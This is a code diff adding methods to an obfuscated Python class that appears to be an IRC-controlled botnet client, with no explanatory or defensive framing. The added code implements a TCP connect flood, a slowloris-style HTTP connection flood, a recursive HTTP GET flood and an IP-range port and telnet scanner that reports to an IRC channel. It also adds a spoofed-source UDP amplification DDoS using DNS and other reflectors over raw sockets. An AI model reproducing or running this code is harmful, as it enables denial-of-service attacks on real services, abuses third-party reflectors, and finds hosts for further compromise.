@@ -501,3 +501,159 @@ class SOoOJjHc():
         self.JWnbDxoo=self.jyzjARwP//int(self.eaxbPqQN[6])
         self.wdVpXFAu.send("PRIVMSG %s :%s packets sent. Sent %s MB, %s MB/s\n" % (self.PtOPRyaP,self.PkPsXPwN,self.jyzjARwP,self.JWnbDxoo))
         self.PkPsXPwN=0
+
+    def UYUHvuMj(self,OMpLRZVt,TDvVQeDl,aYxXqxij):
+
+        JCUNsuhq=time.time()+aYxXqxij
+        while JCUNsuhq>time.time():
+            if self.AELmEnMe == 1:
+                return
+            try:
+                xMxEAJzG=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                xMxEAJzG.connect((OMpLRZVt, TDvVQeDl))
+                self.PkPsXPwN+=1
+            except:
+                pass
+        self.PkPsXPwN=0
+    def bvuPxxoe(self,PuaorNVt, KgaiiMDa, sockets, aYxXqxij):
+        JCUNsuhq=time.time()+aYxXqxij
+        self.PkPsXPwN = 0
+        fds = []
+        for bhZHKNhN in xrange(0, int(sockets)):
+            fds.append("")
+        while 1:
+            if self.AELmEnMe == 1:
+                break
+            for bhZHKNhN in xrange(0, int(sockets)):
+                if self.AELmEnMe == 1:
+                    break
+                fds[bhZHKNhN] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                try:
+                    fds[bhZHKNhN].connect((PuaorNVt, int(KgaiiMDa)))
+                except:
+                    pass
+            srIDmVhC = "GET / HTTP/1.1\nHost: %s:%s\nUser-agent: %s\nAccept: */*\nConnection: Keep-Alive\n\n" % (PuaorNVt, KgaiiMDa, random.choice(self.GbASkEbE))
+            for JJCaPJKF in srIDmVhC:
+                if self.AELmEnMe == 1:
+                    break
+                for fd in fds:
+                    try:
+                        fd.send(JJCaPJKF)
+                        self.PkPsXPwN+=1
+                    except:
+                        try:
+                            fd.connect((PuaorNVt, int(KgaiiMDa)))
+                        except:
+                            pass
+                if JCUNsuhq<time.time():
+                    for fd in fds:
+                        try:
+                            fd.close()
+                        except:
+                            pass
+                    return
+                time.sleep(1)
+                self.PkPsXPwN = 0
+        self.wdVpXFAu.send("PRIVMSG %s :Made %s connections.\n" % (self.PtOPRyaP,self.PkPsXPwN))
+        self.PkPsXPwN=0
+    def hiJdZHaX(self,cShnQVxK):
+        try:
+            opener = urllib2.build_opener()
+            opener.addheaders = [('User-agent', random.choice(self.GbASkEbE))]
+            return opener.open(cShnQVxK).read()
+        except:
+            return ""
+    def szpMLewu(self,url,aYxXqxij,recursive):
+        if recursive=="true":
+            JCUNsuhq=time.time()+aYxXqxij
+            while JCUNsuhq>time.time():
+                if self.AELmEnMe == 1:
+                    break
+                for guyZmDXC in re.findall('''href=["'](.[^"']+)["']''',self.hiJdZHaX(url), re.I):
+                    if self.AELmEnMe == 1:
+                        break
+                    self.hiJdZHaX(guyZmDXC)
+                for guyZmDXC in re.findall('''src=["'](.[^"']+)["']''',self.hiJdZHaX(url), re.I):
+                    if self.AELmEnMe == 1:
+                        break
+                    self.hiJdZHaX(guyZmDXC)
+
+        else:
+            JCUNsuhq=time.time()+aYxXqxij
+            while JCUNsuhq>time.time():
+                if self.AELmEnMe == 1:
+                    break
+                self.hiJdZHaX(url)
+    def PBsHzYzW(self,SvxFYfhn,TDvVQeDl,OmgjPABz):
+        self.wdVpXFAu.send("PRIVMSG %s :Scanning range %s for port %s, scanning for telnet? %s\n" % (self.PtOPRyaP,SvxFYfhn,TDvVQeDl,OmgjPABz))
+
+        for hDfReyUF in self.sZSansOC(SvxFYfhn):
+            try:
+                if self.AELmEnMe == 1:
+                    return
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect((hDfReyUF,int(TDvVQeDl))) #Make sure OMpLRZVt is up and port is open.
+                s.close()
+                self.wdVpXFAu.send("PRIVMSG %s :%s\n" % (self.PtOPRyaP,hDfReyUF))
+            except:
+                pass
+        self.wdVpXFAu.send("PRIVMSG %s :Finished scanning range %s\n" % (self.PtOPRyaP,SvxFYfhn))
+    def DDoS(self, target, threads, domains, timee):
+        self.target = target
+        self.threads = threads
+        self.timeend = time.time()+timee
+        self.domains = domains
+        for i in range(self.threads):
+            t = threading.Thread(target=self.__attack)
+            t.start()
+    def __send(self, sock, soldier, proto, payload):
+        udp = UDP(random.randint(1, 65535), PORT[proto], payload).pack(self.target, soldier)
+        ip = IP(self.target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
+        sock.sendto(ip+udp+payload, (soldier, PORT[proto]))
+    def __GetQName(self, domain):
+        labels = domain.split('.')
+        QName = ''
+        for label in labels:
+            if len(label):
+                QName += pack('B', len(label)) + label
+        return QName
+    def __GetDnsQuery(self, domain):
+        id = pack('H', random.randint(0, 65535))
+        QName = self.__GetQName(domain)
+        return PAYLOAD['dns'].format(id, QName)
+    def __attack(self):
+        global proto
+        global npackets
+        global nbytes
+        _files = files
+        for proto in _files:    # Open Amplification files
+            f = open(_files[proto][FILE_NAME], 'r')
+            _files[proto].append(f)        # _files = {'proto':['file_name', file_handle]}
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        i = 0
+        while 1:
+            try:
+                if time.time()>=self.timeend or self.AELmEnMe == 1:
+                    break
+                soldier = _files[proto][FILE_HANDLE].readline().strip()
+                if soldier:
+                    if proto=='dns':
+                        if not amplification[proto].has_key(soldier):
+                            amplification[proto][soldier] = {}
+                        for domain in self.domains:
+                            amp = self.__GetDnsQuery(domain)
+                            self.__send(sock, soldier, proto, amp)
+                    else:
+                        amp = PAYLOAD[proto]
+                        self.__send(sock, soldier, proto, amp)
+                else:
+                    _files[proto][FILE_HANDLE].seek(0)
+            except:
+                pass
+        try:
+            sock.close()
+            for proto in _files:
+                _files[proto][FILE_HANDLE].close()
+        except:
+            pass
+
